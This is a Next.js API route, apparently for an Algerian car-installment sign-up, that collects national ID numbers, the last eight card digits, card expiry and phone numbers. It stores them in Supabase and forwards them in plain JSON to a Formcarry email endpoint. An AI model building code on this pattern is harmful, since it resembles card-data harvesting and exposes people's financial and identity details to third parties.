import { NextResponse } from "next/server"
import { createClient } from "@/lib/supabase/server"
import { cars } from "@/lib/data"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { fullName, nin, cardLast8, cardExpiry, phone1, phone2, hasPreviousInstallment, selectedCarId, selectedCar: carFromBody } = body

    // Use car from body or find by ID
    const selectedCar = carFromBody || cars.find((car) => car.id === selectedCarId)

    // Save to Supabase
    const supabase = await createClient()
    
    const { data: registration, error: dbError } = await supabase
      .from("registrations")
      .insert({
        full_name: fullName,
        nin: nin,
        card_last8: cardLast8,
        card_expiry: cardExpiry,
        phone1: phone1,
        phone2: phone2 || null,
        has_previous_installment: hasPreviousInstallment ?? false,
        selected_car_id: selectedCarId,
        status: "pending",
      })
      .select()
      .single()

    if (dbError) {
      console.error("[v0] Supabase insert error:", dbError)
      return NextResponse.json(
        { success: false, message: "حدث خطأ في حفظ البيانات" },
        { status: 500 }
      )
    }

    // Also send to Formcarry for email notifications (non-blocking)
    try {
      await fetch("https://formcarry.com/s/ZXsyzAQSlEQ", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify({
          fullName: fullName,
          nin: nin,
          phone1: phone1,
          phone2: phone2 || "غير محدد",
          cardNumber: cardLast8,
          cardExpiry: cardExpiry,
          hasPreviousInstallment: hasPreviousInstallment ? "نعم" : "لا",
          selectedCar: selectedCar ? `${selectedCar.brand} ${selectedCar.model}` : "لم يتم الاختيار",
          carPrice: selectedCar ? `${selectedCar.price} دج` : "",
          monthlyPayment: selectedCar ? `${selectedCar.monthlyPayment} دج/شهر` : "",
          registrationDate: new Date().toLocaleString("ar-DZ"),
          _subject: `تسجيل جديد: ${fullName}`,
        }),
      })
    } catch (formcarryError) {
      // Log but don't fail the registration if Formcarry fails
      console.error("[v0] Formcarry error (non-critical):", formcarryError)
    }

    return NextResponse.json({ 
      success: true,
      message: "تم تسجيل بيانات العميل بنجاح",
      registration
    })
  } catch (error) {
    console.error("[v0] Registration error:", error)
    return NextResponse.json(
      { success: false, message: "حدث خطأ في التسجيل" },
      { status: 500 }
    )
  }
}
